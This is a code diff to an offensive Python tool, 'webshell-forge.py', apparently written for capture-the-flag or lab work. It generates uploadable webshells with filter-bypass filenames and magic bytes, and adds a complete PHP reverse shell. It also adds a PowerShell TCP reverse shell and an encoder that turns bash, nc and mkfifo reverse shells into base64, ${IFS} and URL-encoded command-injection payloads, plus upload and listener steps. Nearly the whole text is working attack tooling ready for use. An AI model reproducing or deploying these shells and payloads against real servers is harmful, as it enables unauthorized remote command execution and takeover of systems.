@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-webshell-forge.py  v1.1.0
+webshell-forge.py  v1.2.0
 Stack-aware webshell forge. Generates cmd + reverse shells for a given server
 stack, clones them across every execute-able extension, and adds double-ext /
 case / trailing-dot / magic-byte bypasses. Writes an ffuf wordlist to find which
@@ -19,6 +19,7 @@ Examples:
   webshell-forge.py -s aspx -b -w                # IIS + bypasses + wordlist
   webshell-forge.py -p myshell.php -s php        # clone YOUR payload instead
   webshell-forge.py -s all -b -w -u http://$ip/uploads
+  webshell-forge.py -e --lhost 10.10.14.5 --lport 443     # revshell encoder (cmd injection)
 """
 import argparse, os, sys, shutil, subprocess, re
 from pathlib import Path
@@ -72,6 +73,59 @@ PS_REV = ("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient("
           "while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding)"
           ".GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write("
           "([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\"")
+
+SHELLX_PHP = """<?php
+// Universal PHP reverse shell — Linux + Windows
+// Usage: shell.php?ip={LHOST}&port={LPORT}  (defaults below already stamped)
+// Or hardcode below as fallback
+
+$ip   = isset($_GET['ip'])   ? $_GET['ip']   : '{LHOST}';
+$port = isset($_GET['port']) ? $_GET['port'] : '{LPORT}';
+
+// Detect OS and pick the right shell
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+    // Windows — use cmd.exe
+    $shell = 'cmd.exe';
+} else {
+    // Linux/Unix — use bash if available, fall back to sh
+    $shell = file_exists('/bin/bash') ? '/bin/bash' : '/bin/sh';
+}
+
+set_time_limit(0);
+$sock = fsockopen($ip, (int)$port, $errno, $errstr, 30);
+if (!$sock) { die("$errstr ($errno)\\n"); }
+
+$descriptorspec = [
+    0 => ['pipe', 'r'],
+    1 => ['pipe', 'w'],
+    2 => ['pipe', 'w'],
+];
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+if (!is_resource($process)) { die("Can't spawn shell\\n"); }
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock,     0);
+
+while (!feof($sock) && !feof($pipes[1])) {
+    $r = [$sock, $pipes[1], $pipes[2]];
+    $w = $e = null;
+    stream_select($r, $w, $e, null);
+
+    if (in_array($sock,      $r)) fwrite($pipes[0], fread($sock,      1400));
+    if (in_array($pipes[1],  $r)) fwrite($sock,     fread($pipes[1],  1400));
+    if (in_array($pipes[2],  $r)) fwrite($sock,     fread($pipes[2],  1400));
+}
+
+fclose($sock);
+array_map('fclose', $pipes);
+proc_close($process);
+"""
+
+# swap the minimal php reverse stub for the fuller universal shellx.php
+SHELLS["php"]["reverse"] = SHELLX_PHP
 
 IMG_EXTS = ["jpg", "jpeg", "png", "gif"]
 MAGIC = b"GIF89a;\n"   # content-sniff bypass; PHP ignores leading bytes
@@ -135,6 +189,55 @@ def bypass_names(stem, exts):
     return names
 
 
+
+# ── ENCODER: reverse shell -> injection-safe forms ────────────────────────────
+def encode_revshell(lhost, lport, shell="bash"):
+    """Emit a reverse shell in forms that survive a filename/param -> shell -> Burp
+    boundary. base64 avoids shell metacharacters; the wrapper decodes+executes on
+    the target. This is the Vanity pattern: OS command injection through a hostile
+    boundary where spaces/quotes/redirects get mangled."""
+    import base64, urllib.parse
+
+    raw = {
+        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "sh":   f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "nc":   f"nc {lhost} {lport} -e /bin/bash",
+        "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+    }.get(shell, f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
+
+    b64 = base64.b64encode(raw.encode()).decode()            # single line, -w0 equiv
+    inject = f";echo {b64}|base64 -d|bash;"                    # terminate + run
+    inject_ifs = f";echo${{IFS}}{b64}|base64${{IFS}}-d|bash;"    # spaces filtered
+    url_once = urllib.parse.quote(inject, safe="")             # for Burp (encode ONCE)
+
+    out = []
+    C = lambda t,c: col(t,c)
+    out.append(C("=== reverse shell encoder ===", 36))
+    out.append(f"[*] target : {lhost}:{lport}  ({shell})")
+    out.append("")
+    out.append(C("[1] raw (paste into a shell ON THE TARGET only):", 33))
+    out.append("    " + raw)
+    out.append("")
+    out.append(C("[2] base64 (the blob):", 33))
+    out.append("    " + b64)
+    out.append("")
+    out.append(C("[3] inject-ready (drop into filename/param injection point):", 33))
+    out.append("    " + inject)
+    out.append("")
+    out.append(C("[4] ${IFS} variant (when SPACES are filtered):", 33))
+    out.append("    " + inject_ifs)
+    out.append("")
+    out.append(C("[5] URL-encoded for Burp (send raw; do NOT let Burp encode again):", 33))
+    out.append("    " + url_once)
+    out.append("")
+    out.append(C("[>] catch it:", 33) + f"  rlwrap -cAr nc -lvnp {lport}")
+    out.append(C("[!] encoding layers:", 31) + " if the boundary decodes once, use [3];")
+    out.append("    if it double-decodes (Burp + server), don't pre-encode -- use [3] raw.")
+    out.append("    NEVER pipe these to bash on Kali -- they run WHERE executed (target only).")
+    print("\n".join(out))
+    return raw, b64, inject
+
+
 def forge(args):
     stacks = list(PROFILES) if args.stack == "all" else [args.stack]
     out = Path(args.out)
@@ -142,7 +245,7 @@ def forge(args):
         shutil.rmtree(out)
     out.mkdir(parents=True, exist_ok=True)
 
-    print(col("=== webshell-forge v1.1.0 ===", 36))
+    print(col("=== webshell-forge v1.2.0 ===", 36))
     print(f"[*] stacks : {', '.join(stacks)}")
     print(f"[*] shell  : {'your file' if args.payload else args.type}"
           + (f"  ({args.lhost or 'LHOST'}:{args.lport})"
@@ -179,64 +282,166 @@ def forge(args):
 
     print("\n" + col(f"[+] {len(all_names)} payloads written to {out}/", 36))
 
-    # start a listener reminder for reverse shells
+    # ── NEXT STEPS — copy/paste, in order ────────────────────────────────────
+    stem0 = build_payload(args, stacks[0])[1]
+    ext0  = PROFILES[stacks[0]][0]
+    U     = args.url or "http://TARGET/uploads"
+    print("\n" + col("┌─ NEXT STEPS ───────────────────────────────────────────", 36))
+    print(col("│", 36) + " 1. upload every file in " + col(f"{out}/", 32) +
+          " via the app's form / Burp Intruder /")
+    print(col("│", 36) + "    a curl loop:")
+    print(col("│", 36) + col(f"    for f in {out}/*; do curl -s -F 'file=@'$f {U}/ -o /dev/null; done", 32))
+    if args.wordlist:
+        print(col("│", 36) + " 2. find which extension the server EXECUTES (non-zero size = ran):")
+        print(col("│", 36) + col(f"    ffuf -u {U}/FUZZ -w {out}/shells.txt -mc 200 -fs 0", 32))
     if args.type == "reverse" and not args.payload:
-        print("\n" + col("[>] catch it:", 33) + f"  nc -nlvp {args.lport}")
+        lh = args.lhost or "LHOST"; lp = args.lport
+        print(col("│", 36) + " 3. start your listener, THEN trigger the shell:")
+        print(col("│", 36) + col(f"    rlwrap -cAr nc -lvnp {lp}", 33) + col("   ← run this first", 90))
+        print(col("│", 36) + col(f"    curl 'http://TARGET/{stem0}.{ext0}'", 32) +
+              col(f"   (LHOST {lh}:{lp} already baked in)", 90))
+        print(col("│", 36) + col(f"    override on the fly: ...{stem0}.{ext0}?ip=<LHOST>&port=<LPORT>", 90))
         if any("reverse" not in SHELLS.get(s, {}) for s in stacks):
-            ps = PS_REV.replace("{LHOST}", args.lhost or "LHOST").replace("{LPORT}", str(args.lport))
-            print(col("[>] Windows-stack reverse (run via ?c=):", 33))
-            print("    " + ps)
-
-    if args.url:
-        stem0 = build_payload(args, stacks[0])[1]
-        print("\n" + col("[>] find which extension executes:", 33))
-        print("    " + col(f"ffuf -u {args.url}/FUZZ -w {out}/shells.txt -mc 200 -fs 0", 32))
-        print(f"    confirm:  curl '{args.url}/{stem0}.{PROFILES[stacks[0]][0]}?c=id'")
+            ps = PS_REV.replace("{LHOST}", lh).replace("{LPORT}", str(lp))
+            print(col("│", 36) + col("    Windows stack — no native reverse; run this via ?c= :", 90))
+            print(col("│", 36) + "    " + col(ps, 32))
+    else:
+        print(col("│", 36) + " 3. confirm execution:")
+        print(col("│", 36) + col(f"    curl '{U}/{stem0}.{ext0}?c=id'", 32))
+        print(col("│", 36) + col("    then swap ?c=id for a reverse shell (see: webshell-forge -e)", 90))
+    print(col("└────────────────────────────────────────────────────────", 36))
 
 
 # ── INTERACTIVE MODE ──────────────────────────────────────────────────────────
 def ask(prompt, default=None, choices=None):
-    d = f" [{default}]" if default is not None else ""
+    d = col(f" [{default}]", 90) if default is not None else ""
     while True:
-        v = input(col(f"  {prompt}{d}: ", 36)).strip()
+        try:
+            v = input(col(f"  {prompt}", 36) + d + col(" > ", 36)).strip()
+        except (EOFError, KeyboardInterrupt):
+            print(col("\n[!] cancelled", 31)); sys.exit(0)
         if not v and default is not None:
             return default
         if choices and v and v not in choices:
-            print(col(f"    choose one of: {', '.join(choices)}", 31)); continue
+            print(col(f"    ! pick one of: {', '.join(choices)}", 31)); continue
         if v or default is not None:
             return v
 
 
+def ask_int(prompt, default):
+    while True:
+        v = ask(prompt, str(default))
+        if str(v).isdigit() and 0 < int(v) < 65536:
+            return int(v)
+        print(col("    ! enter a port 1-65535", 31))
+
+
+def ask_lhost(auto):
+    """Prompt for LHOST, showing the auto-detected tun0 IP as default."""
+    if auto:
+        print(col(f"    (detected tun0: {auto})", 90))
+    while True:
+        v = ask("LHOST", auto or None)
+        if v and re.match(r"^\d+\.\d+\.\d+\.\d+$", v):
+            return v
+        if v == auto and auto:
+            return auto
+        print(col("    ! that doesn't look like an IP — check `ip a show tun0`", 31))
+
+
 def yesno(prompt, default=False):
-    d = "Y/n" if default else "y/N"
-    v = input(col(f"  {prompt} ({d}): ", 36)).strip().lower()
+    d = col(" [Y/n]", 90) if default else col(" [y/N]", 90)
+    try:
+        v = input(col(f"  {prompt}", 36) + d + col(" > ", 36)).strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        print(col("\n[!] cancelled", 31)); sys.exit(0)
     if not v:
         return default
     return v.startswith("y")
 
 
+def banner():
+    print(col(r"""
+  webshell-forge  ·  v1.2.0
+  stack-aware shells + upload-filter bypass + injection encoder
+""", 36))
+
+
+MENU = """  What are you doing?
+
+    """ + col("1", 32) + """) PHP upload   — shells + bypasses + ffuf wordlist   """ + col("(most common)", 90) + """
+    """ + col("2", 32) + """) IIS upload   — .aspx/.ashx shells + bypasses
+    """ + col("3", 32) + """) Reverse shell — PHP connect-back (shellx)
+    """ + col("4", 32) + """) Encoder      — base64 revshell for command injection
+    """ + col("5", 32) + """) Custom       — every option, step by step
+"""
+
+
 def interactive():
-    print(col("=== webshell-forge :: interactive ===", 36))
+    banner()
+    print(MENU)
+    choice = ask("choose", "1", ["1", "2", "3", "4", "5"])
+    auto = detect_lhost()
+
+    # ---- PRESETS: sensible defaults, minimal prompts ----
+    if choice == "1":   # PHP upload — the 90% case
+        print(col("\n  → PHP upload attack: cmd shells across all php exts, bypasses on, wordlist on.\n", 90))
+        a = _preset(stack="php", type="cmd", bypass=True, magic=True, wordlist=True)
+        a.url = ask("target upload URL (blank = skip ffuf line)", "") or None
+        print(); return forge(a)
+
+    if choice == "2":   # IIS upload
+        print(col("\n  → IIS upload attack: aspx cmd shells + bypasses + wordlist.\n", 90))
+        a = _preset(stack="aspx", type="cmd", bypass=True, magic=True, wordlist=True)
+        a.url = ask("target upload URL (blank = skip ffuf line)", "") or None
+        print(); return forge(a)
+
+    if choice == "3":   # PHP reverse
+        print(col("\n  → PHP reverse shell (shellx). Start a listener after.\n", 90))
+        lhost = ask_lhost(auto)
+        lport = ask_int("LPORT", 443)
+        a = _preset(stack="php", type="reverse", bypass=True, magic=True, wordlist=True,
+                    lhost=lhost, lport=lport)
+        a.url = ask("target upload URL (blank = skip ffuf line)", "") or None
+        print(); return forge(a)
+
+    if choice == "4":   # Encoder
+        print(col("\n  → Reverse-shell encoder for command injection.\n", 90))
+        lhost = ask_lhost(auto)
+        lport = ask_int("LPORT", 443)
+        shell = ask("shell flavour", "bash", ["bash", "sh", "nc", "mkfifo"])
+        print(); return encode_revshell(lhost, lport, shell)
+
+    # ---- CUSTOM: full control ----
+    print(col("\n  → Custom forge — every option.\n", 90))
     a = SimpleNamespace(payload=None, clean=False)
     a.stack = ask("stack", "php", list(PROFILES) + ["all"])
     a.type = ask("shell type", "cmd", ["cmd", "reverse"])
     a.lhost, a.lport = None, 443
     if a.type == "reverse":
-        auto = detect_lhost()
-        a.lhost = ask("LHOST", auto or "") or (auto or "LHOST")
-        a.lport = int(ask("LPORT", "443") or "443")
-    own = ask("use your own payload file? (path, blank=generate)", "")
+        a.lhost = ask_lhost(auto)
+        a.lport = ask_int("LPORT", 443)
+    own = ask("use your own payload file? (path, blank = generate)", "")
     if own:
         a.payload = own
     a.name = ask("base filename stem", "shell")
     a.out = ask("output dir", "./shells")
-    a.bypass = yesno("add bypass variants (double-ext/case/trailing)?", False)
-    a.magic = yesno("prepend GIF89a magic bytes?", False)
+    a.bypass = yesno("add bypass variants (double-ext / case / trailing)?", True)
+    a.magic = yesno("prepend GIF89a magic bytes?", True)
     a.wordlist = yesno("write shells.txt wordlist?", True)
-    a.url = ask("target upload URL for ffuf line (blank=skip)", "") or None
+    a.url = ask("target upload URL for ffuf line (blank = skip)", "") or None
     a.clean = yesno("wipe output dir first?", False)
     print()
     forge(a)
+
+
+def _preset(stack, type, bypass, magic, wordlist, lhost=None, lport=443):
+    """Build an args namespace with the common defaults pre-filled."""
+    return SimpleNamespace(
+        payload=None, stack=stack, type=type, lhost=lhost, lport=lport,
+        name="shell", out="./shells", bypass=bypass, magic=magic,
+        wordlist=wordlist, url=None, clean=False,
+    )
 
 
 def main():
@@ -257,6 +462,10 @@ def main():
     ap.add_argument("-m", "--magic", action="store_true", help="prepend GIF89a magic bytes")
     ap.add_argument("-w", "--wordlist", action="store_true", help="write shells.txt for ffuf")
     ap.add_argument("-u", "--url", help="print ffuf line against URL/FUZZ")
+    ap.add_argument("-e", "--encode", action="store_true",
+                    help="reverse-shell encoder for command injection (base64/URL/${IFS})")
+    ap.add_argument("--shell", default="bash", choices=["bash","sh","nc","mkfifo"],
+                    help="reverse shell flavour for --encode (default: bash)")
     ap.add_argument("--clean", action="store_true", help="wipe outdir before writing")
 
     # no args at all -> interactive
@@ -265,6 +474,9 @@ def main():
     args = ap.parse_args()
     if args.interactive:
         return interactive()
+    if args.encode:
+        lhost = args.lhost or detect_lhost() or 'LHOST'
+        return encode_revshell(lhost, args.lport, args.shell)
     if args.type == "reverse" and not args.lhost and not args.payload:
         args.lhost = detect_lhost()
     forge(args)
